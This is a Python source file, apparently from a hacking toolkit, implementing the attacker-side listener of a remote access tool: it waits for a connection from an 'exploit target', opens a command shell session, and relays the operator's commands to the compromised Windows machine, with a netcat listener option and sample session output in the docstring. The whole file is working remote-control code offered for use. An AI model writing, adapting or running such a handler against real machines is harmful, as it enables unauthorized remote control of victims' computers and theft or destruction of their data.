#!/usr/bin/python
"""
 Exploit Remote Access Control
 Author and Created by Mochammad Rizki (ReztDev)
 started running exploit:
 
 [+] Started listening handler on socket 192.168.10.123:4444
 [+] Waiting connection from exploit target
 [+] Exploit connect on 192.168.10.123:59972 at 20:37:25
 [+] Running on Windows-8-6.2.9200 (192.168.10.123:59972)
 [+] Command shell session opened (192.168.10.123:4444 -> 192.168.10.123:59972)
 
  DESKTOP_PC1 > dir
  Volume in drive D has no label
  Volume Serial Number is 0123-P123
 
  Directory of D:\Testing\exploit.exe
 
  07/12/2018  23:10      <DIR>          .
  07/12/2018  23:10      <DIR>          ..
  07/12/2018  23:10           4.852.813 exploit.exe
                 1 File(s)        4.852.813 bytes 
                 2 Dir(s)    26.209.546.240 bytes free
"""

import src.source.use
from src.banner.color import pycolor_style
from src.Logging.print_stdout import (
    print_error, print_process, print_warning
)

class Listener_Handler(object):
    def __init__(self, ip_address, port_address):
        self.hostname = ip_address
        self.port_address = int(port_address)
        if not self.hostname:
            print_warning("Please input your ip address!!")
            src.source.use.sys.exit(0)

    def main_handler(self):
        try:
            sock = src.source.use.socket.socket(src.source.use.socket.AF_INET, src.source.use.socket.SOCK_STREAM)
            sock.bind((self.hostname, self.port_address))
            print_process(
                "Started listening handler on socket {host}:{port}".format(
                    host=self.hostname, port=self.port_address
                )
            )
            src.source.use.time.sleep(1)
            print_process("Waiting connection from exploit target")
            sock.listen(5)
            try:
                socks, add = sock.accept()
                print_process(
                    "Exploit connect on {host}:{port} at {time}".format(
                        host=str(add[0]), port=str(add[1]), time=src.source.use.time.strftime("%H:%M:%S")
                    )
                )
                src.source.use.time.sleep(1)
                self.version_shell = socks.recv(1024)
                print_process(self.version_shell)
                print_process(
                    "Command shell session opened ({h}:{p} -> {hs}:{ps})\n".format(
                        h=self.hostname, p=self.port_address, hs=str(add[0]), ps=str(add[1])
                    )
                )
                src.source.use.time.sleep(1)
                while True:
                    try:
                        self.cmd = raw_input(pycolor_style.L + "shell"+ pycolor_style.W +" > ")
                        if self.cmd == "mkdir":
                            try:
                                direct = self.cmd.split()[2]
                                socks.send('mkdir {}'.format(direct))
                            except IndexError:
                                print_warning("usage: mkdir [filename]")

                        elif self.cmd == "help":
                            pass

                        elif self.cmd == "interact":
                            socks.send("interact")
                            if src.source.use.os.name == "nt":
                                src.Logging.print_stdout.print_error(
                                    "Windows Not support, Sorry -_-"
                                )
                                continue
                            else:
                                src.source.use.os.system(
                                    "nc -lvp {port}".format(
                                        port=self.port_address
                                    )
                                )

                        elif self.cmd == "del":
                            try:
                                filename = self.cmd.split()[2]
                                socks.send('del {}'.format(filename))
                            except IndexError:
                                print_warning("usage: del [file / folder]")

                        else:
                            socks.send(self.cmd)
                            result = socks.recv(4096)
                            print(str(result))

                    except KeyboardInterrupt:
                        print
                        print_error(
                            "Close interaction with {host}:{port}".format(
                                host=str(add[0]),
                                port=str(add[1])
                            )
                        )
                        socks.close()
                        break
                    except EOFError:
                        print_error("Close session...")
                        socks.close()
                        break
            except src.source.use.socket.error as error:
                print_error(str(error))
        except src.source.use.socket.error as error_socket:
            print_error(str(error_socket))
        except KeyboardInterrupt:
            print_error("User Interrupt..!! Aborted.")
